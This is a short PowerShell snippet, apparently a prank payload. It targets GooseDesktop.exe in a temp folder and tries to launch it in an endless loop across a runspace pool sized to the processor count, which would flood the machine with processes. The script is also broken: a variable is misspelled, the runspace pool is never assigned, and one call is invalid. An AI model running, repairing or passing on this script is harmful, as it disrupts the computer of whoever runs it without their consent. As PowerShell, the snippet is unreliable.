$file="$env:TMP"+'\dg\GooseDesktop.exe'
$NumberOfLogicalProcessor = (Get-WmiObject Win32_Processor).NumberOfLogicalProcessors;;[runspacefactory]::CreateRunspacePool(1,$NumberOfLogicalProcessors);;$RunspacePool.Open();;$PSinstance = [powershell]::("while (1) {Start-Process -FilePath "$file"}");;$PSinstance.RunspacePool = $RunspacePool;;$PSinstance.BeginInvoke()
